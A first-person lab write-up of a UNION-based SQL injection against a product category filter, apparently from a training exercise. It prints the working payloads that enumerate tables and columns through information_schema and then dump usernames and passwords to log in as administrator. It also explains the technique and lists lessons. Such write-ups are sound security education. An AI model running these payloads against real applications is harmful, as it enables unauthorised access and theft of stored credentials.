SQL Injection: Listing Database Contents

Objective

The lab contained a SQL injection vulnerability in the product category filter. The goal was to use a UNION attack to inspect the database, identify the table containing user credentials, retrieve the relevant columns, and use the administrator credentials to log in.

1. Enumerating Database Tables

The first step was to query database metadata and discover the available tables through the vulnerable category parameter. 

'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+

Burp request:

GET /filter?category=Corporate+gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+ HTTP/2

The response contained many PostgreSQL/system tables and application-specific tables. The interesting table was: 

users_opuwqc
Lesson: The table name was discovered rather than guessed.

2. Discovering the Columns

Next, I queried information_schema.columns for the table we had discovered. 

'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_opuwqc'--+

The response revealed these relevant columns:

Column Purpose
username_smnbau Username
password_sidmsv Password
email Email address

3. Retrieving the Credentials

Once the table and column names were known, I selected the username and password columns: 

'+UNION+SELECT+username_smnbau,password_sidmsv+FROM+users_opuwqc--+

The response returned the contents of those columns. I located the administrator account and used its corresponding password to log in.

Lab solved. The administrator credentials were successfully retrieved through the UNION-based SQL injection.

5. Why UNION Worked

A UNION attack combines the result of an injected SELECT statement with the result of the application's original query. The vulnerable query accepted two result columns, so the injected queries also returned two columns. 

SELECT table_name, NULL ...

Later, the two columns were used to retrieve useful data:

SELECT username_smnbau, password_sidmsv ...

6. Key Lessons

  • Do not immediately guess table names when database metadata can be queried.
  • information_schema.tables can reveal table names.
  • information_schema.columns can reveal the columns in a table.
  • UNION attacks require a compatible number of columns.
  • Database-specific syntax matters.
  • The important skill is understanding the investigation sequence, not memorizing a final payload.

Final Takeaway

The main lesson was that SQL injection is a structured investigation. Instead of guessing credentials or table names, I used the database's metadata to progressively discover the schema and then retrieve the required records.
